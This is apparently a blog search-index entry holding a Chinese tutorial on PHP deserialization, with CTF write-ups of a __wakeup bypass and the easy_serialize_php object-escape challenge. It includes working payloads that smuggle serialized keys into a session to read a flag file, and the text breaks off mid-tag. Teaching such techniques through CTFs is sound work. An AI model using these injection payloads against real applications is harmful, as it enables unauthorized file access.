<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反序列化学习</title>
      <link href="2021/01/15/php-fan-xu-lie-hua/"/>
      <url>2021/01/15/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>首先，从php的序列化入手</p><p>PHP 的所谓的序列化是一个将各种类型的数据，压缩并按照一定格式存储的过程，用到的函数是serialize()</p><p>主要是以下两个函数</p><pre class="line-numbers language-none"><code class="language-none">serialize()     //将一个对象转换成一个字符串unserialize()   //将字符串还原成一个对象<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过序列化和反序列化可以在php中方便的传递对象</p><p><strong>记住重要的一点，序列化只序列化属性，类里面的属性是不会被序列化的</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"kkk"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210116213945438.png" alt="image-20210116213945438"></p><pre class="line-numbers language-none"><code class="language-none">一些字符缩写a - array                  b - boolean  d - double                 i - integero - common object          r - references - string                 C - custom objectO - class                  N - nullR - pointer reference      U - unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有个小细节，可以看到flag那个属性原来是4个字符的，序列化之后还是4个字符；但Testname明明是8个字符，但却显示10个字符通过查资料后发现和自己定义的类的属性有关。</p><p>默认的Public属性，序列化之后还是不变的，长度是多少就是多少</p><p>但Private属性序列化后的格式是：<code>%00类名%00属性名</code> 也就是说私有属性序列化的结果是在类名和属性名的前面加个空白符给他们分隔开</p><p>而Protect属性的格式则是：<code>%00*%00属性名</code>  这样做或许是为了更好的区分不同的属性类型吧，具体作用还不是很清楚</p><p>序列化和反序列化类似与压缩和解压的过程，所以反序列化就是把序列化后的字符串还原成原来的状态的过程</p><p>随便拿一串序列化后的字符串来反序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210116223655589.png" alt="image-20210116223655589"></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><p>下面是一些常见的方法</p><pre class="line-numbers language-none"><code class="language-none">__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p>举个 例子加深理解</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">Caiji</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * serialize前调用 用于删选需要被序列化存储的成员变量     * @return array [description]     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'ID'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sex'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">/**     * unserialize前调用 用于预先准备对象资源     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Caiji</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'twosmi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$me</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//存在__sleep(函数，$info属性不会被存储</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$me</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$temp</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//__wakeup()组装的$info</span><span class="token variable">$me</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210116224757374.png" alt="image-20210116224757374"></p><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><blockquote><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span> <span class="token operator">=</span> <span class="token variable">$ID</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ID: %s, age: %d, sex: %s"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">ID</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">info</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$me</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'smi1e'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'__toString:'</span> <span class="token operator">.</span> <span class="token variable">$me</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210116225051701.png" alt="image-20210116225051701"></p><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="以前做过的一个题"><a href="#以前做过的一个题" class="headerlink" title="以前做过的一个题"></a>以前做过的一个题</h4><p>主要代码为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目要求序列化一下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化之后并不是最终的payload，这里反序列的时候先调用_wakeup()函数，会把username初始化为guest，所以需要绕过它。</p><p>而绕过_wakeup()函数只需要让对象的属性数比它实际的大就行</p><h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>根据代码提示，在phpinfo里面找到一个这个</p><p><img src="https://anwar.oss-cn-shenzhen.aliyuncs.com/picgo/image-20210116234920656.png" alt="image-20210116234920656"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//它的主要作用是将数组展开，键名作为变量名，元素值为变量值</span><span class="token comment">//int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</span><span class="token comment">//本函数用来将变量从数组中导入到当前的符号表中。接受结合数组 var_array 作为参数并将键名当作变量名，值作为变量的值。对每个键值对都会在当前的符号表中建立变量，并受到 extract_type 和 prefix 参数的影响。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到第一个函数，会过滤掉一些关键词，很显然这是一种对象逃逸的题</p><p>过滤函数一般分为两种情况：<br><strong>第一种为关键词数增加</strong></p><p>例如： where-&gt;hahaha，这样词数由五个增加到6个</p><p><strong>第二种为关键词数减少</strong></p><p>比如会直接过滤掉一些关键词，这道题一样</p><p>过滤函数filter()对serialize($_SESSION)进行过滤，滤掉一些关键字<br>那么我们有两种方法：<br><strong>键逃逸和值逃逸</strong></p><p>值逃逸：<br>需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}&amp;function=show_image<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dump的结果为：</p><pre class="line-numbers language-none"><code class="language-none">"a:3{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>键逃逸：</p><p>只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dump的结果为：</p><pre class="line-numbers language-none"><code 